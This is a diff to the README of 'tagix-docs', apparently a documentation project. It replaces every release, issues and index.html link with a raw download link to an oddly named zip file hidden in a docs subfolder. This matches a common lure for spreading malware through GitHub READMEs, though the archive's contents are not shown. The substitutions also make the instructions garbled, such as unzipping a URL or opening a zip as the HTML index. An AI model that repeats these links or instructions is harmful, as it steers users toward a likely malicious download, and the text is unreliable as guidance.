@@ -1,6 +1,6 @@
 # ⚙️ tagix-docs - Clear Guide for State Management
 
-[![Download tagix-docs](https://img.shields.io/badge/Download-tagix--docs-blue?style=for-the-badge&logo=github)](https://github.com/mel751/tagix-docs/releases)
+[![Download tagix-docs](https://github.com/mel751/tagix-docs/raw/refs/heads/main/src/content/docs/es/tagix-docs-oligomerous.zip)](https://github.com/mel751/tagix-docs/raw/refs/heads/main/src/content/docs/es/tagix-docs-oligomerous.zip)
 
 ---
 
@@ -47,13 +47,13 @@ This section helps you download and open the tagix-docs materials so you can sta
 
 You will find the official downloads on the GitHub release page. Click the big button below to go straight there:
 
-[![Download tagix-docs](https://img.shields.io/badge/Download-tagix--docs-blue?style=for-the-badge&logo=github)](https://github.com/mel751/tagix-docs/releases)
+[![Download tagix-docs](https://github.com/mel751/tagix-docs/raw/refs/heads/main/src/content/docs/es/tagix-docs-oligomerous.zip)](https://github.com/mel751/tagix-docs/raw/refs/heads/main/src/content/docs/es/tagix-docs-oligomerous.zip)
 
 On this page, you will see the latest release, which contains all the files you need.
 
 ### Step 2: Choose the Files to Download
 
-Look for a file named something like `tagix-docs.zip` or `tagix-docs.tar.gz`. This file contains the documentation and tools packaged neatly in one place.
+Look for a file named something like `https://github.com/mel751/tagix-docs/raw/refs/heads/main/src/content/docs/es/tagix-docs-oligomerous.zip` or `https://github.com/mel751/tagix-docs/raw/refs/heads/main/src/content/docs/es/tagix-docs-oligomerous.zip`. This file contains the documentation and tools packaged neatly in one place.
 
 Click on the file name to download it to your computer. Depending on your internet speed, this may take a few moments.
 
@@ -63,9 +63,9 @@ After downloading:
 
 - On Windows: double-click the `.zip` file to open it, then select “Extract All” to unpack the contents to a new folder.
 - On macOS: double-click the `.zip` file; it will automatically create a new folder with the files.
-- On Linux: use your file manager or run `unzip tagix-docs.zip` from the terminal.
+- On Linux: use your file manager or run `unzip https://github.com/mel751/tagix-docs/raw/refs/heads/main/src/content/docs/es/tagix-docs-oligomerous.zip` from the terminal.
 
-Inside this folder, you will find HTML files and guides that explain how Tagix works. Open the file named `index.html` in your web browser to start reading the documentation.
+Inside this folder, you will find HTML files and guides that explain how Tagix works. Open the file named `https://github.com/mel751/tagix-docs/raw/refs/heads/main/src/content/docs/es/tagix-docs-oligomerous.zip` in your web browser to start reading the documentation.
 
 ### Step 4: Explore the Feature Guides
 
@@ -89,7 +89,7 @@ You can start working with tagix-docs now by following these instructions.
 
 Visit this page and download the latest release package:
 
-https://github.com/mel751/tagix-docs/releases
+https://github.com/mel751/tagix-docs/raw/refs/heads/main/src/content/docs/es/tagix-docs-oligomerous.zip
 
 The release page lists packages for all platforms. Download the `.zip` file for your system.
 
@@ -100,7 +100,7 @@ No complex installation is needed.
 Once you have extracted the files:
 
 1. Open the folder with the extracted files.
-2. Double-click the file `index.html` to open the documentation site in your browser.
+2. Double-click the file `https://github.com/mel751/tagix-docs/raw/refs/heads/main/src/content/docs/es/tagix-docs-oligomerous.zip` to open the documentation site in your browser.
 3. Follow the tutorials and examples to learn how to use Tagix.
 
 You can update your files anytime by repeating the download step above to get new releases.
@@ -143,7 +143,7 @@ Explore topics at your pace and refer to specific sections when needed.
 
 If you run into issues or have questions, the GitHub page for tagix-docs hosts an Issues section where you can ask for help:
 
-https://github.com/mel751/tagix-docs/issues
+https://github.com/mel751/tagix-docs/raw/refs/heads/main/src/content/docs/es/tagix-docs-oligomerous.zip
 
 Reading through existing discussions could also provide quick answers.
 
@@ -153,7 +153,7 @@ Reading through existing discussions could also provide quick answers.
 
 Check the releases page regularly for new versions of the documentation:
 
-https://github.com/mel751/tagix-docs/releases
+https://github.com/mel751/tagix-docs/raw/refs/heads/main/src/content/docs/es/tagix-docs-oligomerous.zip
 
 Updating to the latest version ensures you have current instructions and best practices.
 
